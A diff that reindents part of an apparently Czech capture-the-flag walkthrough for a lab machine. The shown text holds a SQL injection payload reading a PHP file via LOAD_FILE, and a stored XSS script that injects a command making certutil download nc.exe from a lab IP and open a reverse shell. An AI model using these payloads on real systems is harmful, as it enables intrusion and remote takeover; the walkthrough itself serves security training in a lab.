@@ -111,7 +111,9 @@ Hopelessromantic
 
 ### Načtení obsahu backdoorchecker.php z výchozí složky Xampp
 - `1' UNION SELECT 1,LOAD_FILE('C:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -`
+
 Obsah se lépe čte pomocí Developer tools prohlížeče na záložce Network
+
 ```php
 <?php
 include('../link.php');
@@ -163,15 +165,15 @@ Odeslání formuláře s následujícím komentářem (IP.AD.RE.SA nahradit vlas
 Skript stáhne nc.exe a otevře reverzní shell
 ```js
 <script>
-function mycallSys(cmd){
-var http=new XMLHttpRequest();
-var params='cmd='+cmd;
-http.open('POST','backdoorchecker.php',true);
-http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
-http.withCredentials = true;
-http.send(params);
-};
-mycallSys('dir|certutil.exe -urlcache -split -f http://10.10.14.11:8000/nc.exe c:\\windows\\temp\\nc.exe | c:\\windows\\temp\\nc.exe 10.10.14.11 4000 -e cmd');
+	function mycallSys(cmd){
+		var http=new XMLHttpRequest();
+		var params='cmd='+cmd;
+		http.open('POST','backdoorchecker.php',true);
+		http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+		http.withCredentials = true;
+		http.send(params);
+	};
+	mycallSys('dir|certutil.exe -urlcache -split -f http://10.10.14.11:8000/nc.exe c:\\windows\\temp\\nc.exe | c:\\windows\\temp\\nc.exe 10.10.14.11 4000 -e cmd');
 </script>
 ```
 
